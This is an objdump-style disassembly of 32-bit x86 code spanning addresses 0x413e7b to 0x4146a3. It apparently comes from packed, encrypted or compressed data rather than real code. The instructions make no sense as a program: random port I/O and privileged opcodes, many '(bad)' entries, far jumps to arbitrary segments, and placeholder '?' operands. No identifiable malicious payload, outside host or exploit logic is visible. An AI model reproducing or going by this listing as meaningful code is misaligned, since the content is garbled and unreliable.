  413e7b:	int    0x20
  413e7d:	sti    
  413e7e:	in     al,dx
  413e7f:	dec    eax
  413e80:	lock adc ah,BYTE PTR [edx+0x35b24ec0]
  413e87:	sub    DWORD PTR [edi-0x65],ebp
  413e8a:	lahf   
  413e8b:	mov    al,ds:0x59e7005
  413e90:	mov    esp,0xb980f223
  413e95:	mov    ds:0xc350ec53,al
  413e9a:	push   edx
  413e9b:	fidiv  WORD PTR [ecx+0x36aff8ca]
  413ea1:	dec    ecx
  413ea2:	add    BYTE PTR [eax],bh
  413ea4:	dec    edx
  413ea5:	enter  0xaf89,0xd2
  413ea9:	jno    0x413e8f
  413eab:	rol    al,1
  413ead:	jo     0x413f01
  413eaf:	loop   0x413ef2
  413eb1:	popa   
  413eb2:	fld    TBYTE PTR [edx]
  413eb4:	pop    esi
  413eb5:	or     cl,cl
  413eb7:	mov    edx,0xb59ac73e
  413ebc:	js     0x413e86
  413ebe:	push   0x100db95d
  413ec3:	imul   ecx,edi,0x1d
  413ec6:	mov    dh,0x5c
  413ec8:	jle    0x413f00
  413eca:	xor    eax,DWORD PTR [esi-0x47]
  413ecd:	mov    eax,ds:0x30aadbd8
  413ed2:	add    ecx,0x0
  413ed5:	inc    ebp
  413ed6:	dec    ebp
  413ed7:	mov    eax,0x8db08ad6
  413edc:	inc    esi
  413edd:	test   eax,0xd04d263
  413ee2:	adc    BYTE PTR [eax+eiz*4],0xc9
  413ee6:	sti    
  413ee7:	and    bl,BYTE PTR [ebx+eax*1]
  413eea:	adc    esi,ebp
  413eec:	add    ecx,DWORD PTR [eax+esi*8]
  413eef:	stc    
  413ef0:	bound  esp,QWORD PTR [esi-0x30]
  413ef3:	lods   eax,DWORD PTR ds:[esi]
  413ef4:	and    al,0x97
  413ef6:	mov    ch,0x85
  413ef8:	sub    eax,0xaafe3d84
  413efd:	fs gs or edi,ebx
  413f01:	cli    
  413f02:	jecxz  0x413ea9
  413f04:	shr    bh,cl
  413f06:	sub    al,0x15
  413f08:	cli    
  413f09:	inc    esp
  413f0a:	imul   esi,DWORD PTR [ecx+0x5ed9706d],0x20
  413f11:	out    dx,eax
  413f12:	push   ss
  413f13:	jmp    DWORD PTR [edi+edx*2-0x66]
  413f17:	repnz sub bh,ah
  413f1a:	cdq    
  413f1b:	mov    al,0x7f
  413f1d:	sub    ebp,DWORD PTR es:[esi+0x45476763]
  413f24:	xor    eax,0xacff2a48
  413f29:	mov    edi,0x10da97ec
  413f2e:	out    0xda,eax
  413f30:	jb     0x413f12
  413f32:	ins    DWORD PTR es:[edi],dx
  413f33:	stos   BYTE PTR es:[edi],al
  413f34:	test   DWORD PTR [eax-0x1f],esp
  413f37:	out    dx,al
  413f38:	mov    WORD PTR [eax+0x74],?
  413f3b:	push   esp
  413f3c:	sbb    DWORD PTR [ebx],0x76bb41bb
  413f42:	imul   eax,esp,0xdcb410aa
  413f48:	push   0xffffffb1
  413f4a:	repnz push es
  413f4c:	jo     0x413fc2
  413f4e:	iret   
  413f4f:	cmp    ecx,DWORD PTR [edi+0x6d]
  413f52:	addr16 pop esi
  413f54:	push   0x34d12a13
  413f59:	icebp  
  413f5a:	(bad)  
  413f5b:	fadd   st(6),st
  413f5d:	(bad)  
  413f5e:	jmp    0xc4e7:0xd6282bb8
  413f65:	jo     0x413f07
  413f67:	and    bh,BYTE PTR [ebp+0x3a0472f3]
  413f6d:	(bad)  
  413f6e:	(bad)  
  413f6f:	out    0xd2,al
  413f71:	xchg   esp,eax
  413f72:	(bad)  
  413f74:	aaa    
  413f75:	sub    esi,edx
  413f77:	sbb    DWORD PTR [ebp+0x67951ec8],0xffffff98
  413f7e:	cld    
  413f7f:	or     cl,0x5
  413f82:	and    dl,al
  413f84:	mov    edx,0xe1cc0a0b
  413f89:	loopne 0x413f0f
  413f8b:	ins    DWORD PTR es:[edi],dx
  413f8c:	xchg   edi,eax
  413f8d:	xor    DWORD PTR [edi+0x242a9206],edi
  413f93:	pop    esp
  413f94:	rcl    DWORD PTR [edx],1
  413f96:	sahf   
  413f97:	outs   dx,DWORD PTR ds:[esi]
  413f98:	adc    BYTE PTR [ecx-0x3b],bh
  413f9b:	mov    ds:0x264c8fa1,al
  413fa0:	xor    ah,BYTE PTR [ebx]
  413fa2:	adc    ch,BYTE PTR [edi+0x34]
  413fa5:	dec    esi
  413fa6:	daa    
  413fa7:	call   0x877fe5de
  413fac:	int3   
  413fad:	xor    ebx,0x20c12971
  413fb3:	adc    dh,dh
  413fb5:	jmp    0xeef95da9
  413fba:	fidiv  DWORD PTR ds:0x935b8772
  413fc0:	bnd jl 0x413faa
  413fc3:	repnz and al,0x30
  413fc6:	xchg   edx,eax
  413fc7:	and    DWORD PTR [ecx],0x7c
  413fca:	dec    eax
  413fcb:	sbb    eax,0x7de58823
  413fd0:	loopne 0x413fb6
  413fd2:	cwde   
  413fd3:	adc    al,0x4e
  413fd5:	mov    ch,dl
  413fd7:	pop    ss
  413fd8:	sub    eax,0x9b2d709b
  413fdd:	sub    eax,0x7ce37fad
  413fe2:	in     al,dx
  413fe3:	cmp    al,0x91
  413fe5:	pop    edi
  413fe6:	aam    0x64
  413fe8:	(bad)  
  413fe9:	fxtract 
  413feb:	mov    dh,0xd
  413fed:	xchg   ecx,eax
  413fee:	push   es
  413fef:	mov    ch,0x23
  413ff1:	mov    ds:0x2a95e29a,eax
  413ff6:	pop    eax
  413ff7:	jmp    0xdf2b:0xa3d01f4b
  413ffe:	mov    eax,ds:0xd63cda06
  414003:	icebp  
  414004:	cld    
  414005:	or     eax,0x652c6d73
  41400a:	inc    ebx
  41400b:	adc    esi,ecx
  41400d:	add    al,0x75
  41400f:	rcl    DWORD PTR [edx+0x62],0x0
  414013:	jns    0x413fb2
  414015:	jns    0x41406a
  414017:	fidivr DWORD PTR [eax]
  414019:	(bad)  
  41401a:	mov    esp,0x6fc32fd5
  41401f:	cld    
  414020:	mov    ds:0xc4b218bd,eax
  414025:	inc    edx
  414026:	imul   eax,DWORD PTR ds:0xfe4a3643,0x593bec62
  414030:	mov    edi,0x61a15f53
  414035:	mov    ebx,0x8d5dc06c
  41403a:	js     0x41402d
  41403c:	fidivr DWORD PTR [eax+0x303abbb6]
  414042:	and    bl,bh
  414044:	jne    0x41408a
  414046:	lds    ecx,FWORD PTR [edx+0x43]
  414049:	clc    
  41404a:	inc    ebp
  41404b:	out    dx,al
  41404c:	pusha  
  41404d:	cmp    ebx,DWORD PTR [ebp-0x26]
  414050:	outs   dx,DWORD PTR ds:[esi]
  414051:	fdivr  st,st(7)
  414053:	outs   dx,BYTE PTR ds:[esi]
  414054:	sbb    DWORD PTR [edx-0x757c70d9],ebp
  41405a:	add    eax,ebp
  41405c:	cwde   
  41405d:	sbb    edi,DWORD PTR [esi]
  41405f:	ficomp DWORD PTR [edi+edx*1+0x6e]
  414063:	gs popa 
  414065:	es xor edx,0xaa40c92f
  41406c:	shrd   DWORD PTR [edx],esi,0xa6
  414070:	mov    edi,0xceb8fe95
  414075:	clc    
  414076:	dec    edx
  414077:	jns    0x4140e4
  414079:	mov    gs,WORD PTR [esi-0x5cbaaa3b]
  41407f:	mov    bh,0x8
  414081:	dec    edx
  414082:	cld    
  414083:	mov    dl,BYTE PTR [eax-0x597f6a57]
  414089:	test   DWORD PTR [esi+0x31],edi
  41408c:	aad    0xd5
  41408e:	jge    0x4140d1
  414090:	sbb    eax,0xbc2f939b
  414095:	add    eax,0x461384c9
  41409a:	les    edx,FWORD PTR [ebx-0x3bcbbb66]
  4140a0:	or     eax,0xdce293f2
  4140a5:	push   edx
  4140a6:	mov    fs,WORD PTR [ecx+0x72]
  4140a9:	and    BYTE PTR [eax],bl
  4140ab:	sub    ah,BYTE PTR [ebx+0x3e76464b]
  4140b1:	in     eax,dx
  4140b2:	pop    es
  4140b3:	loope  0x4140f4
  4140b5:	repnz test eax,ecx
  4140b8:	in     eax,0xd1
  4140ba:	or     al,0x14
  4140bc:	sub    BYTE PTR [esi],cl
  4140be:	sar    dh,1
  4140c0:	inc    esi
  4140c1:	xor    BYTE PTR ds:0xd067a17c,cl
  4140c7:	pop    ds
  4140c8:	sub    eax,0x1b1e52df
  4140cd:	pushf  
  4140ce:	or     DWORD PTR [ebp+0x30e6e924],0xa0acc53b
  4140d8:	sti    
  4140d9:	sar    DWORD PTR [ebx+0x644a1c91],0xdd
  4140e0:	mov    eax,DWORD PTR [esp+edi*8]
  4140e3:	lds    edi,FWORD PTR [edx+esi*4+0x2232237a]
  4140ea:	add    dl,0xcd
  4140ed:	push   ebp
  4140ee:	sbb    BYTE PTR [esi+0x7fa01dbe],ch
  4140f4:	mov    ss,WORD PTR [esi+0x49]
  4140f7:	or     DWORD PTR [ecx+0x2c],ebp
  4140fa:	and    eax,0x358fecca
  4140ff:	fsubrp st(4),st
  414101:	sub    DWORD PTR [ebp+0x36bb51b7],esi
  414107:	xlat   BYTE PTR ds:[ebx]
  414108:	imul   edi,DWORD PTR ds:0x7ff2f05a,0xffffff8f
  41410f:	mov    edi,0x958d02d3
  414114:	dec    eax
  414115:	cmp    BYTE PTR fs:[ebx+edi*2],0x6f
  41411a:	pop    ss
  41411b:	cs pop esi
  41411d:	leave  
  41411e:	or     al,0x65
  414120:	fisub  DWORD PTR ss:[eax-0x2966280d]
  414127:	sub    al,0x23
  414129:	mov    gs,WORD PTR [ebx]
  41412b:	push   cs
  41412c:	test   al,0x0
  41412e:	fwait
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414131:	in     al,dx
  414132:	or     BYTE PTR [esi-0x41],0xa3
  414136:	fidiv  DWORD PTR [ecx+0xa]
  414139:	into   
  41413a:	pop    ds
  41413b:	je     0x414143
  41413d:	add    al,0xe0
  41413f:	popf   
  414140:	push   edx
  414141:	inc    edx
  414142:	mov    BYTE PTR [edx],dl
  414144:	mov    esi,0x26952806
  414149:	add    al,0xe0
  41414b:	aam    0x93
  41414d:	out    dx,al
  41414e:	mov    eax,0x90992431
  414153:	out    dx,al
  414154:	ins    DWORD PTR es:[edi],dx
  414155:	fnstsw WORD PTR [eax+0x7ca3f47d]
  41415b:	mov    bh,0x7c
  41415d:	and    BYTE PTR [ecx],0xb7
  414160:	inc    edi
  414161:	pusha  
  414162:	pop    eax
  414163:	je     0x4141d9
  414165:	jae    0x4141af
  414167:	cmc    
  414168:	cli    
  414169:	mov    edi,0xae2d68aa
  41416e:	dec    edi
  41416f:	or     ch,0xb9
  414172:	ficomp DWORD PTR [ecx+0x707ed5f0]
  414178:	aas    
  414179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41417a:	into   
  41417b:	das    
  41417c:	add    dh,BYTE PTR [esi+0x5e]
  41417f:	(bad)  
  414181:	inc    esp
  414182:	scas   al,BYTE PTR es:[edi]
  414183:	mov    al,ds:0xba3c8e69
  414188:	mov    ds:0xa5b58d1f,al
  41418d:	je     0x414159
  41418f:	jecxz  0x414114
  414191:	int3   
  414192:	xchg   ebx,eax
  414193:	mov    ebx,0x1ba5c1c5
  414198:	add    ebp,edx
  41419a:	xor    ch,dh
  41419c:	adc    eax,0x79e776d9
  4141a1:	mov    ds:0x465fd9af,al
  4141a6:	pop    ecx
  4141a7:	fnstsw WORD PTR [edx]
  4141a9:	jl     0x41421e
  4141ab:	mov    es,WORD PTR [ecx]
  4141ad:	add    al,BYTE PTR [ecx+esi*1]
  4141b0:	(bad)  
  4141b4:	neg    BYTE PTR [ecx]
  4141b6:	sub    eax,0x91b9113c
  4141bb:	jno    0x41416a
  4141bd:	imul   edx,edx,0xec40a194
  4141c3:	xchg   edx,eax
  4141c4:	inc    esp
  4141c5:	popa   
  4141c6:	inc    ebp
  4141c7:	imul   edi,DWORD PTR [eax-0x55f6ad4c],0xef6d3474
  4141d1:	(bad)  
  4141d2:	fwait
  4141d3:	jne    0x414167
  4141d5:	sub    ch,dh
  4141d7:	add    ch,0xb7
  4141da:	xor    ebp,esi
  4141dc:	push   esi
  4141dd:	xchg   edi,eax
  4141de:	dec    esi
  4141df:	mov    dh,0x1d
  4141e1:	pop    eax
  4141e2:	inc    edi
  4141e3:	mov    dl,0xd3
  4141e5:	data16 cmp cl,BYTE PTR [edi]
  4141e8:	cld    
  4141e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ea:	jl     0x414268
  4141ec:	jmp    FWORD PTR [ecx]
  4141ee:	mov    eax,ds:0x23d196a8
  4141f3:	icebp  
  4141f4:	dec    eax
  4141f5:	cmp    eax,0x52163c0c
  4141fa:	dec    esp
  4141fb:	xchg   ebx,eax
  4141fc:	sbb    DWORD PTR [ecx-0x7872d172],0x4e
  414203:	jne    0x41421a
  414205:	push   ds
  414206:	inc    edi
  414207:	ins    BYTE PTR es:[edi],dx
  414208:	std    
  414209:	pop    es
  41420a:	iret   
  41420b:	out    0x64,al
  41420d:	shl    DWORD PTR [edi],cl
  41420f:	mov    ds:0xfafd64a,al
  414214:	fcom   QWORD PTR [edi]
  414216:	stc    
  414217:	mov    BYTE PTR [ebx-0x32fc61a2],0xe
  41421e:	or     edx,DWORD PTR [edx+0x23]
  414221:	pop    ss
  414222:	mov    dl,0xdc
  414224:	mov    dl,0xca
  414226:	and    eax,0x4a983a94
  41422b:	clc    
  41422c:	bts    esi,edx
  41422f:	pop    ds
  414230:	int3   
  414231:	(bad)  
  414232:	mov    al,0x9a
  414234:	adc    BYTE PTR [ebx+0x52608aec],ch
  41423a:	xchg   edx,eax
  41423b:	or     DWORD PTR [edx+eiz*1-0x22],edx
  41423f:	jmp    0xe585b6ef
  414244:	mov    al,ds:0xd5c887f6
  414249:	cld    
  41424a:	frstor [eax-0x70]
  41424d:	cli    
  41424e:	add    edi,esp
  414250:	dec    edi
  414251:	adc    cl,dl
  414253:	stc    
  414254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414255:	mov    DWORD PTR [eax-0x3e],esp
  414258:	dec    esp
  414259:	push   ecx
  41425a:	dec    eax
  41425b:	add    esi,DWORD PTR ss:[edx-0x49fbb6f8]
  414262:	nop
  414263:	add    ecx,esi
  414265:	in     al,0x6f
  414267:	jne    0x4142d0
  414269:	xor    DWORD PTR [ebx+0xdd7986c],ebx
  41426f:	mov    ds:0xa37b2c48,al
  414274:	pop    es
  414275:	mov    ch,0xe
  414277:	pop    esp
  414278:	leave  
  414279:	stos   BYTE PTR es:[edi],al
  41427a:	pop    eax
  41427b:	cmp    esi,DWORD PTR [edx+0x6b28f4f8]
  414281:	es in  al,dx
  414283:	popa   
  414284:	dec    esi
  414285:	clc    
  414286:	shl    BYTE PTR [esi+0x67],cl
  414289:	arpl   bx,ax
  41428b:	jecxz  0x4142d2
  41428d:	and    dl,bl
  41428f:	and    ch,cl
  414291:	loop   0x4142d8
  414293:	aas    
  414294:	mov    bl,0x90
  414296:	pop    ebp
  414297:	ror    BYTE PTR [ebx-0x79d8944a],1
  41429d:	popf   
  41429e:	loop   0x414221
  4142a0:	push   esi
  4142a1:	inc    edx
  4142a2:	cmp    edx,esp
  4142a4:	or     eax,0x2a3b339c
  4142a9:	outs   dx,BYTE PTR ds:[esi]
  4142aa:	into   
  4142ab:	inc    edi
  4142ac:	es inc ebx
  4142ae:	lds    ecx,FWORD PTR [edx-0x48fc900f]
  4142b4:	jmp    0x4142e3
  4142b6:	dec    ebp
  4142b7:	(bad)  
  4142b8:	repnz adc esp,DWORD PTR [eax]
  4142bb:	call   0x7db6:0x9fbb5da4
  4142c2:	dec    esi
  4142c3:	or     al,0x61
  4142c5:	(bad)  
  4142c6:	aas    
  4142c7:	push   cs
  4142c8:	pop    ecx
  4142c9:	lea    esp,[ebx+ebx*2+0x7d]
  4142cd:	shl    edx,1
  4142cf:	icebp  
  4142d0:	in     eax,0x2a
  4142d2:	or     bl,BYTE PTR ds:0x2d531190
  4142d8:	(bad)  
  4142d9:	inc    ebp
  4142da:	stos   DWORD PTR es:[edi],eax
  4142db:	pop    ecx
  4142dc:	sbb    ch,al
  4142de:	jmp    0xb443:0x9a05c467
  4142e5:	lods   al,BYTE PTR ds:[esi]
  4142e6:	pop    ebp
  4142e7:	jb     0x414354
  4142e9:	push   edx
  4142ea:	or     eax,0xac787a2b
  4142ef:	push   cs
  4142f0:	aaa    
  4142f1:	out    dx,eax
  4142f2:	leave  
  4142f3:	int    0x1a
  4142f5:	retf   0xb663
  4142f8:	mov    ebx,0x4f5bee1b
  4142fd:	sbb    ebp,edx
  4142ff:	pop    edx
  414300:	neg    BYTE PTR [eax+0x6f]
  414303:	loop   0x4142f5
  414305:	xchg   edx,eax
  414306:	invd   
  414308:	aaa    
  414309:	mov    bl,0x3e
  41430b:	sub    eax,0x395ba44c
  414310:	outs   dx,BYTE PTR ds:[esi]
  414311:	jno    0x4142ea
  414313:	icebp  
  414314:	jmp    FWORD PTR [esi-0x747cf53e]
  41431a:	mov    eax,0x425865a
  41431f:	pop    ecx
  414320:	and    al,0x5b
  414322:	mov    ds:0xbd4ad06d,eax
  414327:	enter  0xa969,0x5c
  41432b:	cmp    esi,DWORD PTR [ebx+eiz*1-0xc]
  41432f:	repz aas 
  414331:	jl     0x4143a0
  414333:	add    DWORD PTR [eax+0x86c57d6],edx
  414339:	in     al,dx
  41433a:	pop    eax
  41433b:	xchg   ecx,eax
  41433c:	rol    DWORD PTR [eax-0x15ee310d],cl
  414342:	dec    ebp
  414343:	pop    ebp
  414344:	pop    ebp
  414345:	popa   
  414346:	stos   BYTE PTR es:[edi],al
  414347:	and    dh,dh
  414349:	iret   
  41434a:	enter  0x8a3e,0x5c
  41434e:	add    ecx,DWORD PTR [esp+esi*2]
  414351:	lods   eax,DWORD PTR ds:[esi]
  414352:	and    eax,DWORD PTR [eax]
  414354:	ret    0x9ff1
  414357:	push   esp
  414358:	xlat   BYTE PTR ds:[ebx]
  414359:	icebp  
  41435a:	mov    ds:0xee0abd4b,eax
  41435f:	dec    ecx
  414360:	test   BYTE PTR [ebp+edx*4-0x407f62c0],cl
  414367:	loopne 0x414370
  414369:	loop   0x414339
  41436b:	pop    ds
  41436c:	pop    ebp
  41436d:	sbb    eax,edx
  41436f:	out    0xce,al
  414371:	inc    edx
  414372:	mov    ?,WORD PTR [eax+0x76]
  414375:	inc    esi
  414376:	js     0x4143c5
  414378:	enter  0xd0f5,0x4f
  41437c:	cmp    ebp,ebp
  41437e:	dec    edx
  41437f:	call   0x90fb46b1
  414384:	(bad)  
  414385:	stc    
  414386:	lods   eax,DWORD PTR ds:[esi]
  414387:	xchg   ebx,eax
  414388:	inc    ebp
  414389:	inc    esp
  41438a:	or     eax,esp
  41438c:	xor    al,0x85
  41438e:	ss jl  0x4143a6
  414391:	loopne 0x41438a
  414393:	jno    0x41433c
  414395:	dec    edx
  414396:	aam    0x62
  414398:	retf   0x8b9a
  41439b:	sbb    dh,al
  41439d:	dec    edi
  41439e:	mov    cs,WORD PTR [esi-0x79db52f0]
  4143a4:	(bad)  
  4143a5:	mov    ds:0x900047c1,eax
  4143aa:	dec    esp
  4143ab:	aas    
  4143ac:	(bad)  
  4143ad:	xor    al,0x96
  4143af:	and    BYTE PTR [esi-0x61],dh
  4143b2:	add    BYTE PTR [edx-0x7f],0x32
  4143b6:	ret    
  4143b7:	jecxz  0x4143ed
  4143b9:	cs push cs
  4143bb:	sub    esi,DWORD PTR [ebp+0x69]
  4143be:	fs out 0xc,eax
  4143c1:	pop    esp
  4143c2:	sbb    eax,0x79982a03
  4143c7:	xchg   ebp,eax
  4143c8:	sub    eax,0x9063084b
  4143cd:	jecxz  0x414391
  4143cf:	push   0xffffffc2
  4143d1:	or     al,0xd6
  4143d3:	loope  0x4143c7
  4143d5:	popa   
  4143d6:	jle    0x414453
  4143d8:	or     eax,0x83420668
  4143dd:	jp     0x41439a
  4143df:	jo     0x41445a
  4143e1:	sub    eax,0x644c46de
  4143e6:	cmove  eax,DWORD PTR [ebx]
  4143e9:	fistp  QWORD PTR [edx-0x2e]
  4143ec:	mov    ecx,0xe4ff822c
  4143f1:	or     BYTE PTR [edi+0xd4fed0d],ch
  4143f7:	fcomp  DWORD PTR [ebx]
  4143f9:	in     eax,0x5a
  4143fb:	test   eax,0x16337751
  414400:	imul   eax,DWORD PTR [ebx+0x7005278e],0xbd6968d4
  41440a:	push   es
  41440b:	and    al,dl
  41440d:	lea    edi,[ebx+0x2c5fbc6c]
  414413:	fld    DWORD PTR [edi]
  414415:	shl    DWORD PTR es:[esi+0x6b29ad25],0x4c
  41441d:	xchg   ebx,eax
  41441e:	(bad)  
  41441f:	ins    BYTE PTR es:[edi],dx
  414420:	mov    esi,0x92dd3fca
  414425:	mov    ch,0xee
  414427:	sub    al,0x35
  414429:	addr16 js 0x41448c
  41442c:	cld    
  41442d:	mov    ds:0x59c66ada,al
  414432:	iret   
  414433:	shl    esi,1
  414435:	jmp    0x68cc:0xa12795c3
  41443c:	push   edi
  41443d:	dec    BYTE PTR [edx]
  41443f:	js     0x414447
  414441:	pop    ss
  414442:	adc    al,0xf1
  414444:	pop    ss
  414445:	push   0x4f
  414447:	cwde   
  414448:	lds    ebx,FWORD PTR [esi+edx*1-0x5f]
  41444c:	fild   QWORD PTR [edi-0x67]
  41444f:	imul   esp,DWORD PTR [edi],0xffffffd9
  414452:	pop    es
  414453:	cs or  ebp,edi
  414456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414457:	push   es
  414458:	test   eax,0xbe31264
  41445d:	bound  ebx,QWORD PTR [ecx+0x45b341cd]
  414463:	int3   
  414464:	lahf   
  414465:	inc    esp
  414466:	aam    0xc5
  414468:	inc    eax
  414469:	imul   DWORD PTR [edx-0x6f03eb4c]
  41446f:	sbb    al,BYTE PTR [edx+0x57c46081]
  414475:	dec    esi
  414476:	frstor [ebx+0x41]
  414479:	inc    eax
  41447a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41447b:	or     BYTE PTR [esi-0x23],dl
  41447e:	push   es
  41447f:	add    eax,DWORD PTR [edi-0x33626c5d]
  414485:	mov    ebx,0x79571b36
  41448a:	push   eax
  41448b:	imul   eax,ebx,0xd81ae784
  414491:	nop
  414492:	jmp    0xad9ac970
  414497:	lds    eax,FWORD PTR [esi-0x14]
  41449a:	dec    ebx
  41449b:	cld    
  41449c:	(bad)  
  41449d:	or     eax,0x4ba4291c
  4144a2:	inc    si
  4144a4:	loope  0x4144ef
  4144a6:	aaa    
  4144a7:	sub    esp,DWORD PTR [ebp+0x42baeb5]
  4144ad:	jmp    0x6f6ebf2f
  4144b2:	gs sahf 
  4144b4:	sbb    bh,BYTE PTR [ebx+0x34]
  4144b7:	into   
  4144b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b9:	es ja  0x4144dc
  4144bc:	xor    ebx,ebx
  4144be:	adc    DWORD PTR [ecx-0x44],esp
  4144c1:	icebp  
  4144c2:	ja     0x41444d
  4144c4:	ss mov eax,0x9807490a
  4144ca:	arpl   WORD PTR [edx-0x40514479],bp
  4144d0:	mov    bl,0x20
  4144d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144d3:	add    BYTE PTR es:[esi+edx*8],cl
  4144d7:	ins    DWORD PTR es:[edi],dx
  4144d8:	test   eax,0x66f60b1c
  4144dd:	lea    ebp,ds:[ebx]
  4144e0:	out    dx,eax
  4144e1:	pop    ds
  4144e2:	mov    bh,0xef
  4144e4:	mov    dh,0xd8
  4144e6:	inc    eax
  4144e7:	fsub   DWORD PTR [ecx]
  4144e9:	fucomp st(6)
  4144eb:	jmp    0xd25:0xcd34652
  4144f2:	outs   dx,DWORD PTR ds:[esi]
  4144f3:	or     eax,0x932431e9
  4144f8:	iret   
  4144f9:	ins    BYTE PTR es:[edi],dx
  4144fa:	stos   BYTE PTR es:[edi],al
  4144fb:	in     al,dx
  4144fc:	mov    esp,0x4a0c1871
  414501:	fninit 
  414503:	call   0xf697:0x445296d3
  41450a:	xor    eax,ebp
  41450c:	mov    esp,0x694c0aa
  414511:	fadd   st(6),st
  414513:	leave  
  414514:	das    
  414515:	xchg   edx,eax
  414516:	aas    
  414517:	dec    esp
  414518:	mov    ah,0x86
  41451a:	gs jae 0x41451e
  41451d:	test   DWORD PTR [edx],ecx
  41451f:	xor    bh,BYTE PTR [edi-0x2a]
  414522:	loopne 0x414512
  414524:	js     0x4144fe
  414526:	sbb    BYTE PTR [ebx-0xf75f42],dh
  41452c:	repnz enter 0xa67a,0x89
  414531:	je     0x414550
  414533:	jb     0x414576
  414535:	xchg   esp,eax
  414536:	sbb    DWORD PTR [ebp-0x67],edx
  414539:	aas    
  41453a:	cdq    
  41453b:	scas   al,BYTE PTR es:[edi]
  41453c:	sub    cl,cl
  41453e:	loopne 0x41452e
  414540:	cli    
  414541:	les    edx,FWORD PTR [ecx-0x76ee7c58]
  414547:	dec    esi
  414548:	call   0x37115311
  41454d:	or     al,0xf5
  41454f:	and    DWORD PTR [edx+0x4165ff66],ebp
  414555:	adc    ecx,DWORD PTR [ebx+ecx*2]
  414558:	icebp  
  414559:	fwait
  41455a:	sub    bl,ch
  41455c:	shl    BYTE PTR [edx-0x4b],cl
  41455f:	bound  ebp,QWORD PTR [ebx-0x7e7271e9]
  414565:	int3   
  414566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414567:	lahf   
  414568:	and    ecx,DWORD PTR [edx+0x30b4faaf]
  41456e:	or     ecx,DWORD PTR [ebp+0x5]
  414571:	fsubr  QWORD PTR [esi-0x7f56df12]
  414577:	xchg   edx,eax
  414578:	cmp    al,0xb0
  41457a:	sbb    al,0xde
  41457c:	add    bl,dh
  41457e:	add    DWORD PTR [ecx+0x6c],0xfffffff2
  414582:	fmul   QWORD PTR [ebp+0x42abbc20]
  414588:	xor    BYTE PTR [esp+ecx*1-0x6f],dh
  41458c:	mov    ds:0xdd6d67c,al
  414591:	dec    ebx
  414592:	xchg   edi,eax
  414593:	scas   al,BYTE PTR es:[edi]
  414594:	or     al,0xf3
  414596:	call   0xf3c939b7
  41459b:	sub    al,0x24
  41459d:	in     al,dx
  41459e:	aas    
  41459f:	inc    ebp
  4145a0:	test   al,0xe7
  4145a2:	ja     0x4145bb
  4145a4:	hlt    
  4145a5:	bound  ebx,QWORD PTR [edx-0x35]
  4145a8:	dec    eax
  4145a9:	mov    BYTE PTR [edi+edi*8-0x2ee80b76],al
  4145b0:	adc    al,0xb3
  4145b2:	data16 add BYTE PTR [ecx+esi*8+0x2ddd10],0x9
  4145bb:	adc    BYTE PTR [ecx+0x32],cl
  4145be:	pop    eax
  4145bf:	jns    0x4145ab
  4145c1:	add    esi,0x33
  4145c4:	lahf   
  4145c5:	lfs    eax,FWORD PTR ds:0x2cda9c09
  4145cc:	fild   WORD PTR [edi]
  4145ce:	add    bl,al
  4145d0:	imul   eax,DWORD PTR [ecx],0xffffffb3
  4145d3:	adc    DWORD PTR [eax+0x49c51cad],edi
  4145d9:	push   0xe
  4145db:	push   0xffc106d
  4145e0:	cmp    ebx,edi
  4145e2:	push   ss
  4145e3:	jmp    0xca76:0x6429425
  4145ea:	xchg   esp,eax
  4145eb:	pop    edi
  4145ec:	pop    esi
  4145ed:	xlat   BYTE PTR ds:[ebx]
  4145ee:	dec    ecx
  4145ef:	ret    
  4145f0:	fs inc esi
  4145f2:	jmp    0x7675d2df
  4145f7:	hlt    
  4145f8:	jp     0x414644
  4145fa:	inc    esp
  4145fb:	inc    esi
  4145fc:	fld    DWORD PTR [ebp-0x15]
  4145ff:	call   0xc2710133
  414604:	mov    al,0xf2
  414606:	loop   0x414611
  414608:	cwde   
  414609:	(bad)  
  41460b:	repnz mov ah,0x83
  41460e:	scas   al,BYTE PTR es:[edi]
  41460f:	out    0x62,al
  414611:	sub    BYTE PTR [edi+ebp*8-0x39],0x8d
  414616:	jae    0x414601
  414618:	rcr    DWORD PTR [esi],cl
  41461a:	ret    
  41461b:	clc    
  41461c:	cdq    
  41461d:	mov    ch,BYTE PTR [edx]
  41461f:	xor    ah,ah
  414621:	inc    ebp
  414622:	and    BYTE PTR [eax+0x1ef99f7],0x47
  414629:	scas   al,BYTE PTR es:[edi]
  41462a:	mov    esp,0x8dba3d17
  41462f:	les    esp,FWORD PTR [ebx+0x65]
  414632:	sub    BYTE PTR [edi+0x72017cd8],dl
  414638:	pop    edx
  414639:	jp     0x414646
  41463b:	retf   
  41463c:	jo     0x414648
  41463e:	or     BYTE PTR ds:0x4d6ba27c,0x7a
  414645:	xchg   esp,eax
  414646:	inc    ebp
  414647:	adc    BYTE PTR [edx+eiz*2+0x2e265a9f],dh
  41464e:	imul   eax,DWORD PTR [edi-0x5126ca05],0x53baa997
  414658:	xchg   esp,eax
  414659:	cmp    eax,0xd501fdbe
  41465e:	rol    esp,0x2a
  414661:	js     0x414626
  414663:	inc    esi
  414664:	jge    0x414646
  414666:	push   esi
  414667:	add    bl,0xfa
  41466a:	je     0x41469a
  41466c:	push   ebp
  41466d:	and    DWORD PTR cs:[edx+ebx*8-0x58401134],eax
  414675:	scas   al,BYTE PTR es:[edi]
  414676:	adc    edx,esp
  414678:	icebp  
  414679:	pop    esp
  41467a:	jecxz  0x414603
  41467c:	popf   
  41467d:	mov    bh,BYTE PTR [edx-0x6]
  414680:	cmp    edi,0x1
  414683:	sbb    dl,BYTE PTR [eax-0x69c4f9e]
  414689:	or     eax,0xa51512ba
  41468e:	and    al,0xb7
  414690:	sbb    DWORD PTR [ebp-0x2bba90fe],ebx
  414696:	cmp    BYTE PTR [edx+eax*4],0x3c
  41469a:	cli    
  41469b:	mov    ds:0x5e0a7403,al
  4146a0:	arpl   WORD PTR [edi],sp
  4146a2:	(bad)  
  4146a3:	mov    ?,WORD PTR [ecx]
